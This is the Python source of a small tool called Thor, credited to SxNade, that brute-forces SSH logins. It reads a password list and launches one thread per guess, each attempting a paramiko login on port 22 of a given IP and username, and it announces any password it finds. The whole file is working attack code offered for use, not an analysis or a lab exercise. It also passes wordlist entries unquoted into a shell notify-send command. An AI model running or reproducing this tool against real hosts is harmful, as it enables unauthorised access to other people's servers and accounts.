#By SxNade
#https://github.com/SxNade/Thor
#CONTRIBUTE
#BRUTEFORCE___SSH

import paramiko
import os
import sys
import socket
import threading, time
from termcolor import colored
#importing the required libraries

exit_tag = 0
#setting the initial value to 0

#thor's hammer!
hammer = '''
 -------
/ SxNade|
\       /
 ---||--
    ||
    ||
    ||
    ||
    ...`
     '''

logo = '''
 ________           
/_  __/ /  ___  ____
 / / / _ \/ _ \/ __/
/_/ /_//_/\___/_/   
                    
                         
           *By SxNade https://github.com/SxNade :: SxNade@protonmail.com
'''
print(logo)
time.sleep(1.5)
print("\n\nThor v2.1a starting...")
os.system("notify-send 'Thor Successfully initiated'")
time.sleep(2)
if len(sys.argv) != 4:
  print(colored("\n[*]usage python3 thor.py <ip> <username> <password-file>\n\n", 'white', attrs=['reverse', 'blink']))
  sys.exit(0)

target_ip = sys.argv[1]
username = sys.argv[2]
password_file = sys.argv[3]
#Grabing the required variables....

#Defning A SSH connect Function to start SSH session Against Target...
def ssh_connect(password, code=0):
  global exit_tag
  ssh = paramiko.SSHClient()
  ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

#checking for each correct password in List 
  try:
    ssh.connect(target_ip, port=22, username=username, password=password)
    exit_tag = 1
    print(colored(f"\n[+]SSH Password For {username} found :> {password}    {hammer}\n", "green", attrs=['bold']))
    os.system(f"notify-send 'Password Found::{password}'")
  except:
    print(colored(f"[!]Incorrect SSH password:> {password}", 'red'))
  ssh.close()

  ssh.close()
  return code

#Checking that if the specified password File exists
if os.path.exists(password_file) == False:
  print(colored("[!] File Not Found", 'red'))
  sys.exit(1)

#Reading For Passwords From the Specified password File..!
with open(password_file, 'r') as file:
  for line in file.readlines():
    if exit_tag == 1:
      t.join()
      #Joining the Threads in-case we found a correct password..
      exit()
    password = line.strip()
    t = threading.Thread(target=ssh_connect, args=(password,))
    t.start()
    #starting threading on ssh_connect function which takes only one argument of password...
    time.sleep(0.5)
    #time in seconds between each successive thread//Don't change it unless very neccessary...!
    #Lowering this time value may cause some errors......!

